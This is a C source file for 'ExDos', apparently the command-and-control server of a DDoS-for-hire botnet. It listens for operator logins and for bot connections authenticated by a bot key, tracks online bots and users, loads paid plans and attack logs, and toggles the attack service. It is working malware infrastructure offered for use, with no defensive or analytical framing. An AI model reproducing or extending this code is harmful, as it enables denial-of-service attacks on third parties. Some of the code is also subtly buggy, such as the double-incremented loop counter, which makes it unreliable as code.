#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../headers/__init__.h"

ExDos *start_up_exDos(str *ip, str *port, str *theme, str *bot_port, str *bot_key, Cogs *cogs) {
    if(!port || !theme)
        return NULL;

    ExDos *c        = (ExDos *)malloc(sizeof(ExDos));
    c->IP           = ip;
    c->Port         = port;
    c->Theme        = RetrieveTheme(theme);
    c->CNC          = CreateSocketAndBind(CreateSocket(IPv4, SOCK_STREAM, NULL, atoi(port->data)));
    c->DB           = RetrieveUserDb(c);
    c->online_users = (void **)malloc(sizeof(void *) * 1);
    c->online_user_count = 0;
    c->online_bots  = new_array();
    c->AttackToggle = 1;
    c->Plans        = get_all_plans();
    c->cogs         = cogs;
    if(!c->DB) // Unable to read DB File
        return NULL;
        
    if(!c->CNC->SockFD || Listen(c->CNC, 999) < 1) // Unable to listen to socket
        return NULL;

    pthread_t listener;
    pthread_create(&listener, NULL, (void *)ListenForUsers, (void *)c);

    if(bot_port != NULL) {
        c->BotKey = bot_key;
        c->BotServer = CreateSocketAndBind(CreateSocket(IPv4, SOCK_STREAM, NULL, atoi(bot_port->data)));
        if(c->BotServer->SockFD == -1 || Listen(c->BotServer, 999) < 1) // Unable to listen to socket
            return NULL;
        
        pthread_t bot_listener;
        pthread_create(&bot_listener, NULL, (void *)ListenForBots, (void *)c);
    }

    return c;
}

void ListenForUsers(void *arg) {
    ExDos *c = (ExDos *)arg;
    
    while(1) {
        Socket *client = Accept(c->CNC);
        if(!client) {
            printf("[ x ] Error, Unable to accept connections!\n");
            continue;
        }

        void **args = (void **)malloc(sizeof(void *) * 2);
        args[0] = (void *)c;
        args[1] = (void *)client;
        pthread_t user_thrd;
        pthread_create(&user_thrd, NULL, (void *)AuthenticateUser, (void *)args);
    }
}

void ListenForBots(void *arg) {
    ExDos *c = (ExDos *)arg;

    while(1) {
        Socket *sock = Accept(c->BotServer);
        if(!sock) {
            printf("[ x ] Error, Unable to accept bot connection.....!");
            continue;
        }

        void **args = (void **)malloc(sizeof(void *) * 2);
        args[0] = (void *)c;
        args[1] = (void *)sock;
        pthread_t bot_handler;
        pthread_create(&bot_handler, NULL, (void *)AuthenticateBot, (void *)args);
    }
}

User **RetrieveUserDb(ExDos *c) {
    User **users    = (User **)malloc(sizeof(User *) * 1);
    long idx        = 0;

    cFile *db       = Openfile(USER_DB_PATH);
    db->Read(db);

    str *raw_db     = string(db->data);
    char RmChars[]  = {'(', ')', '\0'};
    for(int c = 0; c < 3; c++)
        raw_db->ReplaceChar(raw_db, RmChars[c++], ' ');
    raw_db->Strip(raw_db);

    Arr *lines      = Array(raw_db->Split(raw_db, "\n"));

    for(int i = 0; i < lines->idx; i++) {
        str *line = string(lines->arr[i]);
        line->Strip(line);
        if(strlen(line->data) == 0) {
            users[idx] = NULL;
            break;
        }

        Arr *args = Array(line->Split(line, "','"));
        if(args->idx < 8) {
            free(line);
            free(args);
            continue;
        }
        
        users[idx] = new_user(i, args);
        idx++;
        users = (User **)realloc(users, (sizeof(User *) * idx) + 1);

        free(line);
        free(args);
    }

    ((ExDos *)c)->user_idx = idx;

    printf("[ + ] DB Loaded....!\n");

    free(db);
    free(raw_db);
    free(lines);

    return users;
}

void RetrieveLogs(ExDos *c) {
    cFile *raw_logs = Openfile("assets/db/attacks.db");
    if(!raw_logs)
        return;

    raw_logs->Read(raw_logs);
    
    str *logs = string(raw_logs->data);
    c->Logs = Array( !strcmp(logs->data, " ") ? NULL : (strstr(logs->data, "\n") ? logs->Split(logs, "\n") : NULL) );
    c->LogCount = c->Logs->idx;

    raw_logs->Close(raw_logs);
    free(logs);
    free(raw_logs);
}

//start a bot server here

void DebugUsers(ExDos *Dos) {
    for(int i = 0; i < Dos->user_idx; i++) {
        if(!Dos->DB[i])
            break;
        printf("[%d]: %s\n", i, Dos->DB[i]->USERNAME->data);
    }
}

void DebugOnlineUsers(ExDos *Dos) {
    for(int i = 0; i < Dos->online_user_count; i++) {
        printf("%s\n", (char *)((Client *)Dos->online_users[i])->Username->data);
    }
}

User *FindUser(ExDos *Dos, const str *uname) {
    int i = 0;
    while(Dos->DB[i] != NULL) {
        if(!Dos->DB[i] || !Dos->DB[i]->USERNAME)
            break; 

        if(!strcmp(Dos->DB[i]->USERNAME->data, uname->data))
            return Dos->DB[i];
        
        i++;
    }

    return NULL;
}

void toggle_stresser(ExDos *Dos) {
    Dos->AttackToggle = (Dos->AttackToggle == 1 ? 0 : 1);
}

long CountOnlineUser(ExDos *Dos) {
    long c = 0;
    while(Dos->online_users[c] != NULL)
        c++;

    return c;
}

long CountUsers(ExDos *Dos) {
    long c = 0;
    while(Dos->DB[c] != NULL) {
        if(!Dos->DB[c])
            break;
        c++;
    }

    return c;
}

long CountBots(ExDos *Dos) {
    long c = 0;
    while(Dos->online_bots->arr[c] != NULL)
        c++;

    return c;
}